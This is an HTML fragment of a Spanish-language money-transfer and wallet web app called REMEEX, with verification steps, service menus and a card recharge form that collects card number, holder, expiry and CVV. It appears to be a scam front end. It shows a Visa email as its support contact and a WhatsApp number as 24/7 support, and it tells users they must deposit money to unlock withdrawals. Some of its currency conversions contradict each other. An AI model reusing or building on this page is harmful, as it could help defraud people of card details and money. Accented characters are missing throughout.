        <div class="verificacion-section" id="status-recharge" style="display:none;">
          <h3 class="verificacion-titulo" id="first-recharge-title">
            <svg class="icono-titulo" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
              <path stroke="#1d4ed8" stroke-width="2" d="M12 4v16m8-8H4"/>
            </svg>
            Haz tu primera recarga!
          </h3>
          <p class="verificacion-descripcion">Comienza a utilizar todos los servicios recargando con tarjeta de crdito.</p>
          <div class="verificacion-grid">
            <div class="verificacion-card estatus-pendiente">
              <div class="icono-estatus"><i class="fas fa-credit-card"></i></div>
              <div class="contenido-estatus">
                <strong class="status-label">Primera recarga pendiente</strong>
                <p class="status-sublabel">Recarga $25 o ms para activar tu cuenta.</p>
                <div class="botones-validacion">
                  <button class="btn btn-outline btn-small first-recharge-action" id="first-recharge-button">Recargar</button>
                </div>
              </div>
            </div>
          </div>
        </div>

        <!-- Estado 2: Solicitar verificacin -->
        <div class="verificacion-section" id="status-request-verification" style="display:none;">
          <h3 class="verificacion-titulo" id="verify-identity-title">
            <svg class="icono-titulo" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
              <path stroke="#f59e0b" stroke-width="2" d="M12 12v8m0-16v4m8 4h-4m-8 0H4"/>
            </svg>
            Verificacin de Identidad Requerida
          </h3>
          <p class="verificacion-descripcion">Para una mayor seguridad y acceso completo a todas las funciones, verifique su identidad.</p>
          <div class="verificacion-grid">
            <div class="verificacion-card estatus-pendiente">
              <div class="icono-estatus"><i class="fas fa-id-card"></i></div>
              <div class="contenido-estatus">
                <strong class="status-label">Sube tu documento de identidad</strong>
                <p class="status-sublabel">Completa la verificacin para habilitar los retiros.</p>
                <div class="botones-validacion">
                  <button class="btn btn-outline btn-small" id="start-verification-card">Verificar</button>
                </div>
              </div>
            </div>
          </div>
        </div>

        <!-- Estado 3: Proceso de verificacin -->
        <div class="verificacion-section verification-processing-banner" id="status-processing-card" style="display:none;">
          <h3 class="verificacion-titulo" id="verification-processing-heading">Verificando Documentos</h3>
          <p class="verificacion-descripcion" id="verification-processing-text">Estamos revisando su documentacin. Este proceso puede tardar unos minutos.</p>
          <div class="verificacion-grid" id="verification-progress-cards">
            <div class="verificacion-card estatus-pendiente">
              <div class="icono-estatus"><div id="main-processing-spinner" class="verification-processing-spinner"></div></div>
              <div class="contenido-estatus">
                <strong class="status-label" id="verification-processing-title">Procesando Verificacin</strong>
                <div id="verification-progress-container" class="verification-progress-container">
                  <div id="verification-progress-bar" class="verification-progress-bar"></div>
                </div>
                <div id="verification-progress-percent" class="verification-progress-percent">0%</div>
              </div>
            </div>
          </div>
        </div>

        <!-- Estado 4: Verificacin en progreso -->
        <div class="verificacion-section" id="status-final" style="display:none;">
          <h3 class="verificacion-titulo" id="verification-final-heading">
            <svg class="icono-titulo" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
              <path stroke="#1d4ed8" stroke-width="2" d="M5 13l4 4L19 7"/>
            </svg>
            Verificacin en Progreso
          </h3>
          <p class="verificacion-descripcion" id="final-step-text">Falta un ltimo paso para activar todas las funciones.</p>
          <div class="verificacion-grid" id="verification-status-cards">
            <div class="verificacion-card estatus-exitoso" id="status-documents">
              <div class="icono-estatus">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="#10b981" width="24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <div class="contenido-estatus">
                <strong id="status-documents-label" class="status-label">Documento de identidad validado con xito</strong>
                <p id="id-validated-info" class="status-sublabel"></p>
              </div>
            </div>

            <div class="verificacion-card estatus-exitoso" id="status-bank">
              <div class="icono-estatus">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="#10b981" width="24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <div class="contenido-estatus">
                <strong id="status-bank-label" class="status-label">Cuenta de banco registrada con xito</strong>
                <p id="bank-registered-info" class="status-sublabel">
                  <img id="bank-logo-mini" class="bank-logo-mini" alt="Banco" style="display:none;">
                  <span id="bank-name-text">Banco</span> |
                  <span id="bank-account-text">Cuenta N XXXX</span>
                </p>
              </div>
            </div>

            <div class="verificacion-card estatus-pendiente" id="status-bank-validation">
              <div class="icono-estatus">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="#f59e0b" width="24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l2 2m-2 6a9 9 0 100-18 9 9 0 000 18z" />
                </svg>
              </div>
              <div class="contenido-estatus">
                <strong class="status-label">Validacin de datos de cuenta pendiente</strong>
                <p id="pending-validation-info" class="status-sublabel">Para validar debes recargar desde tu propia cuenta y as habilitar tus retiros.</p>
                <div class="botones-validacion">
                  <button class="btn btn-outline btn-small" id="start-recharge">Validar, realizar recarga</button>
                  <button class="btn btn-outline btn-small" id="view-status">Mi Estatus</button>
                  <button class="btn btn-outline btn-small">Soporte</button>
                </div>
              </div>
            </div>
          </div>
        </div>
        
        <!-- Recent Transactions -->
        <div class="card">
          <div class="section-title" style="margin-bottom: 0.5rem;">
            <i class="fas fa-history"></i> Transacciones Recientes
            <a href="#" id="view-all-transactions">Ver todas</a>
          </div>
          <div class="transaction-actions">
            <select id="transaction-filter">
              <option value="all">Todas</option>
              <option value="sent">Enviados</option>
              <option value="received">Recibidos</option>
              <option value="savings">Ahorro</option>
              <option value="exchange">Intercambio</option>
              <option value="services">Servicios</option>
              <option value="summary">Consolidado</option>
            </select>
            <button id="add-widget" class="add-widget-btn"><i class="fas fa-plus"></i></button>
          </div>

        <div class="transaction-list" id="recent-transactions">
          <!-- Will be populated by JavaScript -->
        </div>
      </div>




      </div>
    </div>
  </div>

  <!-- Bottom Navigation -->
  <nav class="bottom-nav" id="bottom-nav" style="display: none;">
    <div class="nav-item" data-section="services">
      <div class="nav-icon"><i class="fas fa-list-alt"></i></div>
      <div class="nav-label">Servicios</div>
    </div>
    
    <div class="nav-item" data-section="cards">
      <div class="nav-icon"><i class="fas fa-credit-card"></i></div>
      <div class="nav-label">Tarjetas</div>
    </div>
    
    <div class="nav-item active" data-section="home">
      <div class="nav-icon"><i class="fas fa-home"></i></div>
      <div class="nav-label">Inicio</div>
    </div>
    
    <div class="nav-item" data-section="support">
      <div class="nav-icon"><i class="fas fa-headset"></i></div>
      <div class="nav-label">Ayuda</div>
    </div>

    <div class="nav-item" data-section="settings">
      <div class="nav-icon"><i class="fas fa-cog"></i></div>
      <div class="nav-label">Ajustes</div>
    </div>
  </nav>

  <!-- Service Overlay -->
  <div class="service-overlay" id="service-overlay">
    <div class="service-container">
      <div class="service-header">
        <div class="service-title">Servicios</div>
        <div class="service-close" id="service-close"><i class="fas fa-times"></i></div>
      </div>
      <div class="service-grid">
        <div class="service-item" id="service-shopping">
          <div class="service-icon shopping">
            <i class="fas fa-shopping-cart"></i>
          </div>
          <div class="service-name">Compras</div>
          <div class="service-description">Usa tu tarjeta</div>
        </div>

        <div class="service-item" id="service-us-account">
          <div class="service-icon us-account">
            <i class="fas fa-flag-usa"></i>
          </div>
          <div class="service-name">Mi cuenta en USA</div>
          <div class="service-description">Banca en EE.UU.</div>
        </div>

        <div class="service-item" id="service-zelle">
          <div class="service-icon zelle">
            <i class="fas fa-university"></i>
          </div>
          <div class="service-name">Activar Zelle</div>
          <div class="service-description">Pagos internacionales</div>
        </div>

        <div class="service-item" id="service-market">
          <div class="service-icon market">
            <i class="fas fa-handshake"></i>
          </div>
          <div class="service-name">Intercambio</div>
          <div class="service-description">Operaciones rpidas</div>
        </div>

        <div class="service-item" id="service-withdrawal">
          <div class="service-icon withdrawal">
            <i class="fas fa-hand-holding-usd"></i>
          </div>
          <div class="service-name">Retiro en efectivo</div>
          <div class="service-description">Cobra tu saldo</div>
        </div>

        <div class="service-item" id="service-savings">
          <div class="service-icon savings">
            <i class="fas fa-piggy-bank"></i>
          </div>
          <div class="service-name">Mis ahorros</div>
          <div class="service-description">Crecimiento seguro</div>
        </div>

        <div class="service-item" id="service-wallets">
          <div class="service-icon wallets">
            <i class="fas fa-wallet"></i>
          </div>
          <div class="service-name">Wallets</div>
          <div class="service-description">Gestiona billeteras</div>
        </div>

        <div class="service-item" id="service-bills">
          <div class="service-icon bills">
            <i class="fas fa-file-invoice"></i>
          </div>
          <div class="service-name">Pago de Servicios</div>
          <div class="service-description">Luz, agua, telfono</div>
        </div>

        <div class="service-item" id="service-donation">
          <div class="service-icon donation">
            <i class="fas fa-hand-holding-heart"></i>
          </div>
          <div class="service-name">Donacin</div>
          <div class="service-description">Apoya fundaciones</div>
        </div>

        <div class="service-item" id="service-crypto">
          <div class="service-icon crypto">
            <i class="fab fa-bitcoin"></i>
          </div>
          <div class="service-name">Criptomonedas</div>
          <div class="service-description">Compra y vende</div>
        </div>

        <div class="service-item" id="service-p2p">
          <div class="service-icon p2p">
            <i class="fas fa-user-friends"></i>
          </div>
          <div class="service-name">P2P</div>
          <div class="service-description">Entre usuarios</div>
        </div>

        <div class="service-item" id="service-exchange">
          <div class="service-icon exchange">
            <i class="fas fa-exchange-alt"></i>
          </div>
          <div class="service-name">Cambio de Divisas</div>
          <div class="service-description">Mejores tasas</div>
        </div>
      </div>
    </div>
  </div>

  <!-- Exchange Overlay -->
  <div class="exchange-overlay" id="exchange-overlay">
    <div class="exchange-container">
      <div class="exchange-header">
        <div class="exchange-title">Intercambio</div>
        <div class="exchange-close" id="exchange-close"><i class="fas fa-times"></i></div>
      </div>
      <p class="exchange-info">Enva y recibe fondos instantneamente entre usuarios REMEEX. Tus operaciones se guardan y podrs retomarlas cuando quieras.</p>
      <div class="exchange-balance">
        <span id="bal-usd"></span>
        <span id="bal-bs"></span>
        <span id="bal-eur"></span>
      </div>
      <div class="exchange-nav">
        <button class="exchange-tab active" data-tab="send">Enviar</button>
        <button class="exchange-tab" data-tab="request">Solicitar</button>
      </div>
      <div class="exchange-form active" id="send-form">
        <input type="email" class="form-control" id="send-email" placeholder="Email del destinatario">
        <div class="exchange-inline">
          <input type="number" class="form-control" id="send-amount" min="50" max="1000" placeholder="Monto">
          <select id="send-currency">
            <option value="usd">USD</option>
            <option value="bs">Bs</option>
            <option value="eur">EUR</option>
          </select>
        </div>
        <textarea id="send-note" placeholder="Concepto (opcional)"></textarea>
        <button class="btn btn-primary" id="send-money-btn">Enviar</button>
        <div class="exchange-status" id="send-status"></div>
      </div>
      <div class="exchange-form" id="request-form">
        <input type="email" class="form-control" id="request-email" placeholder="Email del usuario">
        <div class="exchange-inline">
          <input type="number" class="form-control" id="request-amount" min="50" max="1000" placeholder="Monto">
          <select id="request-currency">
            <option value="usd">USD</option>
            <option value="bs">Bs</option>
            <option value="eur">EUR</option>
          </select>
        </div>
        <textarea id="request-note" placeholder="Concepto (opcional)"></textarea>
        <button class="btn btn-primary" id="request-money-btn">Solicitar</button>
        <div class="exchange-status" id="request-status"></div>
      </div>
      <h4 class="history-title">Historial Reciente</h4>
      <div class="exchange-history" id="exchange-history"></div>
    </div>
  </div>

  <!-- Cards Overlay -->
  <div class="cards-overlay" id="cards-overlay">
    <div class="card-container">
      <div class="card-header">
        <div class="card-title">Tarjeta Virtual VISA</div>
        <div class="card-close" id="card-close"><i class="fas fa-times"></i></div>
      </div>
      
      <div class="virtual-card">
        <div class="card-logo">
          <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" class="card-chip" alt="Chip de tarjeta">
          <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/visa.png" class="card-brand" alt="Logo de Visa">
        </div>
        
        <div class="card-number">   </div>
        
        <div class="card-details">
          <div style="opacity: 0.7;">Verificacin requerida</div>
        </div>
      </div>
      
      <div class="card-apps">
        <div class="card-app"><i class="fab fa-amazon"></i></div>
        <div class="card-app"><i class="fab fa-apple"></i></div>
        <div class="card-app"><i class="fab fa-paypal"></i></div>
        <div class="card-app"><i class="fab fa-spotify"></i></div>
        <div class="card-app"><i class="fab fa-google-play"></i></div>
        <div class="card-app"><i class="fab fa-netflix"></i></div>
      </div>
      
      <div class="card-text">
        Para obtener su tarjeta virtual VISA y poder realizar compras en lnea de forma segura, necesita verificar su identidad. Una vez verificado, podr generar tarjetas virtuales para usar en Amazon, PayPal, Binance, Zinli y otras plataformas.
      </div>
      
    </div>
  </div>

  <!-- Messages Overlay -->
  <div class="messages-overlay" id="messages-overlay">
    <div class="messages-container">
      <div class="messages-header">
        <div class="messages-title">Notificaciones</div>
        <div class="messages-close" id="messages-close"><i class="fas fa-times"></i></div>
      </div>
      
      <div id="messages-list"></div>
    </div>
  </div>

  <!-- Savings Overlay -->
  <div class="savings-overlay" id="savings-overlay">
    <div class="savings-container">
      <div class="savings-header">
        <div class="savings-title">Mis Ahorros</div>
        <div class="savings-close" id="savings-close"><i class="fas fa-times"></i></div>
      </div>
      <div class="summary-grid">
        <div class="summary-card primary">
          <div>Total Ahorrado</div>
          <div class="summary-amount" id="summary-total">$0.00</div>
        </div>
        <div class="summary-card">
          <div>Botes Activos</div>
          <div class="summary-amount" id="summary-count">0</div>
        </div>
      </div>

      <div class="quick-actions">
        <div class="quick-action" id="create-savings-btn">
          <i class="fas fa-plus"></i>
          <div>Nuevo Bote</div>
        </div>
      </div>

      <div class="savings-verify-banner" id="savings-verify-banner" style="display:none;"></div>

      <div class="savings-list" id="savings-list"></div>
    </div>
  </div>

  <!-- Donation Overlay -->
  <div class="donation-overlay" id="donation-overlay">
    <div class="donation-container">
      <div class="donation-header">
        <div class="donation-title">Donaciones</div>
        <div class="donation-close" id="donation-close"><i class="fas fa-times"></i></div>
      </div>
      <div class="donation-form">
        <select id="donation-select">
          <option value="">Seleccione organizacin</option>
        </select>
        <input type="number" id="donation-amount" placeholder="Monto en USD">
        <button class="btn btn-primary" id="donate-submit">Donar</button>
      </div>
    </div>
  </div>

  <!-- Savings Action Modal -->
  <div class="modal-overlay" id="savings-action-modal" style="display:none;">
    <div class="modal">
      <div class="savings-modal-header">
        <div class="modal-title" id="savings-modal-title"></div>
        <div class="savings-modal-close" id="savings-modal-close"><i class="fas fa-times"></i></div>
      </div>
      <div id="savings-modal-body"></div>
      <button class="btn btn-primary" id="savings-modal-confirm">Confirmar</button>
    </div>
  </div>

  <!-- Support Overlay -->
  <div class="support-overlay" id="support-overlay">
    <div class="support-container">
      <div class="support-header">
        <div class="support-title">Ayuda</div>
        <div class="support-close" id="support-close"><i class="fas fa-times"></i></div>
      </div>

      <div class="contact-options">
        <a href="https://wa.me/+17373018059" class="contact-option whatsapp-link" target="_blank">
          <div class="contact-icon whatsapp">
            <i class="fab fa-whatsapp"></i>
          </div>
          <div class="contact-content">
            <div class="contact-title">WhatsApp</div>
            <div class="contact-description">Atencin 24/7 va chat</div>
          </div>
        </a>

        <a href="mailto:contactcenter@visa.com" class="contact-option">
          <div class="contact-icon email">
            <i class="fas fa-envelope"></i>
          </div>
          <div class="contact-content">
            <div class="contact-title">Correo Electrnico</div>
            <div class="contact-description">contactcenter@visa.com</div>
          </div>
        </a>

        <a href="#" class="contact-option" id="forum-chat-link">
          <div class="contact-icon chat">
            <i class="fas fa-comments"></i>
          </div>
          <div class="contact-content">
            <div class="contact-title">Chat con Usuarios</div>
            <div class="contact-description">Conctate con la comunidad</div>
          </div>
        </a>

        <a href="#" class="contact-option" id="live-support-btn">
          <div class="contact-icon live">
            <i class="fas fa-headset"></i>
          </div>
          <div class="contact-content">
            <div class="contact-title">Soporte en Vivo</div>
            <div class="contact-description">Habla con un agente</div>
          </div>
        </a>

        <a href="opinionesremeex" class="contact-option">
          <div class="contact-icon reviews">
            <i class="fas fa-star"></i>
          </div>
          <div class="contact-content">
            <div class="contact-title">Opiniones</div>
            <div class="contact-description">Experiencias de usuarios</div>
          </div>
        </a>
      </div>
    </div>
  </div>

  <!-- Account Edit Modal -->
  <div class="modal-overlay" id="account-edit-modal" style="display:none;">
    <div class="modal">
      <div class="savings-modal-header">
        <div class="modal-title">Editar Cuenta</div>
        <div class="savings-modal-close" id="account-edit-close"><i class="fas fa-times"></i></div>
      </div>
      <div class="form-group">
        <label class="form-label" for="edit-name">Nombre Completo</label>
        <input type="text" class="form-control" id="edit-name">
      </div>
      <div class="form-group">
        <label class="form-label" for="edit-id">Cdula</label>
        <input type="text" class="form-control" id="edit-id" disabled>
      </div>
      <div class="form-group">
        <label class="form-label" for="edit-phone">Telfono</label>
        <input type="text" class="form-control" id="edit-phone" disabled>
      </div>
      <div class="form-group">
        <label class="form-label" for="edit-bank">Banco</label>
        <select class="form-control" id="edit-bank"></select>
      </div>
      <div class="form-group">
        <label class="form-label" for="edit-account-number">Nmero de Cuenta</label>
        <input type="text" class="form-control" id="edit-account-number">
      </div>
      <button class="btn btn-primary" id="save-account-btn">Guardar</button>
    </div>
  </div>

  <!-- Settings Overlay -->
  <div class="settings-overlay" id="settings-overlay">
    <div class="settings-container">
      <div class="settings-header">
        <div class="settings-title">Configuracin</div>
        <div class="settings-close" id="settings-close"><i class="fas fa-times"></i></div>
      </div>
      
      <div class="card" style="margin-bottom: 1rem;">
        <div class="section-title" style="margin-bottom: 1rem;">
          <i class="fas fa-user"></i> Informacin de Cuenta
        </div>
        
        <div class="form-group">
          <label class="form-label" for="settings-name">Nombre Completo</label>
          <input type="text" class="form-control" id="settings-name" disabled>
        </div>
        
        <div class="form-group">
          <label class="form-label" for="settings-email">Correo Electrnico</label>
          <input type="email" class="form-control" id="settings-email" disabled>
        </div>
      </div>
      
      <div class="card" style="margin-bottom: 1rem;">
        <div class="section-title" style="margin-bottom: 1rem;">
          <i class="fas fa-bell"></i> Notificaciones
        </div>
        
        <div style="display: flex; flex-direction: column; gap: 1rem;">
          <div style="display: flex; align-items: center; justify-content: space-between;">
            <div>Notificaciones por correo</div>
            <label class="switch">
              <input type="checkbox" checked>
              <span class="slider round"></span>
            </label>
          </div>
          
          <div style="display: flex; align-items: center; justify-content: space-between;">
            <div>Notificaciones por SMS</div>
            <label class="switch">
              <input type="checkbox" checked>
              <span class="slider round"></span>
            </label>
          </div>
          
          <div style="display: flex; align-items: center; justify-content: space-between;">
            <div>Alertas de seguridad</div>
            <label class="switch">
              <input type="checkbox" checked>
              <span class="slider round"></span>
            </label>
          </div>
        </div>
      </div>
      
      <div class="card" style="margin-bottom: 1rem;">
        <div class="section-title" style="margin-bottom: 1rem;">
          <i class="fas fa-shield-alt"></i> Seguridad
        </div>
        
        <div style="display: flex; flex-direction: column; gap: 1rem; margin-bottom: 1rem;">
          <div style="display: flex; align-items: center; justify-content: space-between;">
            <div>Autenticacin de dos factores</div>
            <label class="switch">
              <input type="checkbox">
              <span class="slider round"></span>
            </label>
          </div>
          
          <div style="display: flex; align-items: center; justify-content: space-between;">
            <div>Notificaciones de inicio de sesin</div>
            <label class="switch">
              <input type="checkbox" checked>
              <span class="slider round"></span>
            </label>
          </div>
        </div>
        
        <button class="btn btn-primary" id="verify-identity-btn">
          <i class="fas fa-id-card"></i> Verificar mi Identidad
        </button>
      </div>

      <!-- NUEVA IMPLEMENTACIN: Botones de Verificacin y Activacin -->
      <div class="card" style="margin-bottom: 1rem;">
        <div class="section-title" style="margin-bottom: 1rem;">
          <i class="fas fa-cogs"></i> Gestin de Cuenta
        </div>
        
      <div class="settings-buttons">
        <button class="settings-nav-btn" id="verification-nav-btn">
          <div class="settings-nav-icon verification">
            <i class="fas fa-id-card"></i>
          </div>
          <div class="settings-nav-content">
            <div class="settings-nav-title">Verificacin</div>
            <div class="settings-nav-description">Verificar identidad y documentos</div>
          </div>
        </button>
          
        <button class="settings-nav-btn" id="activation-nav-btn">
          <div class="settings-nav-icon activation">
            <i class="fas fa-check-circle"></i>
          </div>
          <div class="settings-nav-content">
            <div class="settings-nav-title">Activacin</div>
            <div class="settings-nav-description">Activar servicios y funciones</div>
          </div>
        </button>
        <button class="settings-nav-btn" id="limits-nav-btn">
          <div class="settings-nav-icon limits">
            <i class="fas fa-chart-line"></i>
          </div>
          <div class="settings-nav-content">
            <div class="settings-nav-title">Lmites</div>
            <div class="settings-nav-description">Ver tus lmites mensuales</div>
          </div>
        </button>
      </div>
      </div>

      <div class="card" id="account-card" style="display:none;">
        <div class="account-header">
          <div class="section-title" style="margin-bottom:0;">
            <i class="fas fa-id-card"></i> Mi Cuenta
          </div>
          <div class="account-actions">
            <button class="btn-icon" id="refresh-account-btn" title="Refrescar"><i class="fas fa-sync-alt"></i></button>
            <button class="btn-icon" id="edit-account-btn" title="Editar"><i class="fas fa-pen"></i></button>
          </div>
        </div>
        <div class="account-info">
          <div><i class="fas fa-user"></i><strong> Nombre:</strong> <span id="account-name"></span></div>
          <div><i class="far fa-id-card"></i><strong> Cdula:</strong> <span id="account-id"></span></div>
          <div><i class="fas fa-phone"></i><strong> Telfono:</strong> <span id="account-phone"></span></div>
          <div><i class="fas fa-university"></i><strong> Banco:</strong> <span id="account-bank"></span></div>
          <div><i class="fas fa-hashtag"></i><strong> Nmero de Cuenta:</strong> <span id="account-number-display"></span></div>
          <div id="account-logo"></div>
        </div>
        <div class="account-balance">
          <div><strong>USD:</strong> <span id="account-balance-usd"></span></div>
          <div><strong>Bs:</strong> <span id="account-balance-bs"></span></div>
          <div><strong>EUR:</strong> <span id="account-balance-eur"></span></div>
        </div>
        <details class="account-section" id="limits-section">
          <summary><strong>Lmites y Seguridad</strong></summary>
          <div class="account-limits">
            <div class="limit-info">
              <p>En Remeex puedes manejar hasta <strong>10.000 USD</strong> en tu cuenta.</p>
              <p>Los retiros a Banesco estn permitidos hasta <strong>5.000 USD</strong> sin necesidad de justificantes. Tus lmites se actualizan mensualmente.</p>
            </div>
            <label for="withdrawal-limit-slider">Lmite de Retiros</label>
            <input type="range" id="withdrawal-limit-slider" min="25" max="10000" step="25">
            <div>Actual: <span id="withdrawal-limit-value" class="limit-value"></span> USD</div>
            <label for="deposit-limit-slider">Lmite de Depsitos</label>
            <input type="range" id="deposit-limit-slider" min="25" max="10000" step="25">
            <div>Actual: <span id="deposit-limit-value" class="limit-value"></span> USD</div>
            <div style="margin-top:0.5rem; display:flex; align-items:center; justify-content:space-between;">
              <span>Habilitar Retiros</span>
              <label class="switch">
                <input type="checkbox" id="withdrawal-toggle">
                <span class="slider round"></span>
              </label>
            </div>
            <div style="margin-top:0.5rem; display:flex; align-items:center; justify-content:space-between;">
              <span>Congelar Cuenta</span>
              <label class="switch">
                <input type="checkbox" id="freeze-toggle">
                <span class="slider round"></span>
              </label>
            </div>
            <div style="margin-top:0.5rem;">
              <label for="primary-currency">Moneda Principal</label>
              <select id="primary-currency" class="form-control" style="margin-top:0.25rem;">
                <option value="usd">USD</option>
                <option value="bs">Bs</option>
                <option value="eur">EUR</option>
              </select>
            </div>
          </div>
        </details>
        <details class="account-section" id="banks-section">
          <summary><strong>Mis Bancos</strong></summary>
          <div class="account-banks" id="account-banks">
            <div id="banks-list"></div>
            <button class="btn btn-primary" id="add-bank-btn" style="margin-top:0.5rem;">Aadir Banco</button>
          </div>
        </details>
      </div>

      <button class="btn btn-primary" id="logout-btn" style="margin-top: 1rem;">
        <i class="fas fa-sign-out-alt"></i> Cerrar Sesin
      </button>
      <button class="btn btn-primary" id="resolve-problem-btn" style="margin-top: 1rem; display:none; background:#007bff;">
        <i class="fas fa-tools"></i> Resolver Problema
      </button>
    </div>
  </div>
  <!-- Recharge Container -->
  <div class="recharge-container" id="recharge-container">
    <div class="section-title" style="margin-bottom: 1.5rem; display: flex; align-items: center;">
      <i class="fas fa-arrow-left" id="recharge-back" style="cursor: pointer; margin-right: 1rem;"></i>
      <span>Recargar Saldo</span>
    </div>
    
    <div class="security-badge" style="margin-bottom: 1.5rem;">
      <div class="security-badge-icon">
        <i class="fas fa-lock"></i>
      </div>
      <div class="security-badge-content">
        <div class="security-badge-title">Transaccin Segura</div>
        <div class="security-badge-text">Todos los pagos estn protegidos con cifrado SSL</div>
      </div>
    </div>

    <div class="payment-method-tabs">
      <div class="payment-method-tab active" data-target="card-payment">Tarjeta de Crdito</div>
      <div class="payment-method-tab" data-target="bank-payment">Transferencia Bancaria</div>
      <div class="payment-method-tab" data-target="mobile-payment">Pago Mvil</div>
    </div>

    <!-- Credit Card Payment Method -->
    <div class="payment-method-content active" id="card-payment">
      <div class="card">
        <div style="margin-bottom: 1.25rem; text-align: center;">
          <div style="font-size: 0.8rem; color: var(--neutral-600); margin-bottom: 0.5rem;">Tasa de cambio actual:</div>
          <div style="display: inline-block; background: var(--primary); color: white; font-size: 0.8rem; font-weight: 600; padding: 0.5rem 0.75rem; border-radius: var(--radius-md);">
            <span id="card-exchange-rate-display">1 USD = 151.10 Bs | 1 USD = 0.94 EUR</span>
          </div>
        </div>

        <!-- Saved Card Container (initially hidden) -->
        <div class="saved-card-container" id="saved-card-container">
          <div class="saved-card">
            <div class="saved-card-icon">
              <i class="fab fa-cc-visa"></i>
            </div>
            <div class="saved-card-details">
              <div class="saved-card-number">   3009</div>
              <div class="saved-card-type">VISA</div>
            </div>
            <div class="saved-card-use">
              <input type="checkbox" id="use-saved-card" class="saved-card-checkbox" checked>
              <label for="use-saved-card">Usar esta tarjeta</label>
            </div>
          </div>
          <!-- Botn para pagar directamente con tarjeta guardada -->
          <button class="saved-card-pay-btn" id="saved-card-pay-btn" disabled>
            <i class="fas fa-credit-card"></i> Seleccione un monto
          </button>
        </div>
        
        <div class="section-title" style="margin-bottom: 0.5rem; font-size: 0.9rem;">
          <i class="fas fa-money-bill"></i> Seleccione un Monto
        </div>
        
        <select class="amount-select" id="card-amount-select">
          <option value="" selected disabled>-- Seleccione un monto --</option>
          <option value="10" data-bs="0" data-eur="0">$10</option>
          <option value="500" data-bs="66670" data-eur="470">$500  Bs 66.670,00  470,00</option>
          <option value="1000" data-bs="133340" data-eur="940">$1.000  Bs 151.100,00  940,00</option>
          <option value="1500" data-bs="200010" data-eur="1410">$1.500  Bs 200.010,00  1.410,00</option>
          <option value="2000" data-bs="266680" data-eur="1880">$2.000  Bs 266.680,00  1.880,00</option>
          <option value="3000" data-bs="400020" data-eur="2820">$3.000  Bs 400.020,00  2.820,00</option>
          <option value="4000" data-bs="533360" data-eur="3760">$4.000  Bs 533.360,00  3.760,00</option>
          <option value="5000" data-bs="666700" data-eur="4700">$5.000  Bs 666.700,00  4.700,00</option>
          <option value="6000" data-bs="800040" data-eur="5640">$6.000  Bs 800.040,00  5.640,00</option>
          <option value="7000" data-bs="933380" data-eur="6580">$7.000  Bs 933.380,00  6.580,00</option>
          <option value="8000" data-bs="1066720" data-eur="7520">$8.000  Bs 1.066.720,00  7.520,00</option>
        </select>
      </div>
      
      <div class="card" id="card-form-container" style="margin-top: 1.5rem;">
        <div class="section-title" style="margin-bottom: 1rem;">
          <i class="fas fa-credit-card"></i> Detalles de la Tarjeta
        </div>
        
        <div class="card-preview" id="card-preview">
          <div class="card-inner">
            <div class="card-front">
              <div class="card-logo">
                <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" class="card-chip" alt="Chip de tarjeta">
                <img id="card-brand-logo" src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/visa.png" class="card-brand" alt="Logo de Visa">
              </div>
              
              <div class="card-number" id="card-number-display">   </div>
              
              <div class="card-details">
                <div class="card-holder">
                  <div style="opacity: 0.7; font-size: 0.7rem; margin-bottom: 4px;">Titular</div>
                  <div id="card-holder-display"> </div>
                </div>
                
                <div class="card-expiry">
                  <div style="text-align: right;">
                    <div style="opacity: 0.7; font-size: 0.7rem; margin-bottom: 4px;">Expira</div>
                    <div><span id="card-month-display"></span>/<span id="card-year-display"></span></div>
                  </div>
                </div>
              </div>
            </div>
            
            <div class="card-back">
              <div class="card-stripe"></div>
              <div style="padding: 0 1.25rem;">
                <div style="font-size: 0.7rem; margin-bottom: 0.5rem;">CVV</div>
                <div class="card-cvv" id="card-cvv-display"></div>
              </div>
            </div>
          </div>
        </div>
        
        <div class="card-form">
          <div class="form-group">
            <label class="form-label" for="cardName">Titular de la Tarjeta</label>
            <input type="text" class="form-control" id="cardName" placeholder="Nombre como aparece en la tarjeta" aria-describedby="card-name-error">
            <div class="error-message" id="card-name-error">Por favor, introduce el nombre del titular.</div>
          </div>
          
          <div class="form-group">
            <label class="form-label" for="cardNumber">Nmero de Tarjeta</label>
            <input type="tel" class="form-control" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" pattern="[0-9 ]*" aria-describedby="card-number-error">
            <div class="error-message" id="card-number-error">Nmero de tarjeta no vlido.</div>
          </div>
          
          <div class="card-row">
            <div class="card-col">
              <label class="form-label">Fecha de Expiracin</label>
              <div style="display: flex; gap: 0.5rem;">
                <select class="form-control" id="cardMonth" aria-describedby="card-date-error">
                  <option value="" disabled selected>Mes</option>
                  <option value="01">01</option>
                  <option value="02">02</option>
                  <option value="03">03</option>
                  <option value="04">04</option>
                  <option value="05">05</option>
                  <option value="06">06</option>
                  <option value="07">07</option>
                  <option value="08">08</option>
                  <option value="09">09</option>
                  <option value="10">10</option>
                  <option value="11">11</option>
                  <option value="12">12</option>
                </select>
                
                <select class="form-control" id="cardYear" aria-describedby="card-date-error">
                  <option value="" disabled selected>Ao</option>
                  <option value="2025">2025</option>
                  <option value="2026">2026</option>
                  <option value="2027">2027</option>
                  <option value="2028">2028</option>
                  <option value="2029">2029</option>
                  <option value="2030">2030</option>
                </select>
              </div>
              <div class="error-message" id="card-date-error">Por favor, selecciona una fecha vlida.</div>
            </div>
            
            <div class="card-col" style="max-width: 120px;">
              <label class="form-label" for="cardCvv">CVV</label>
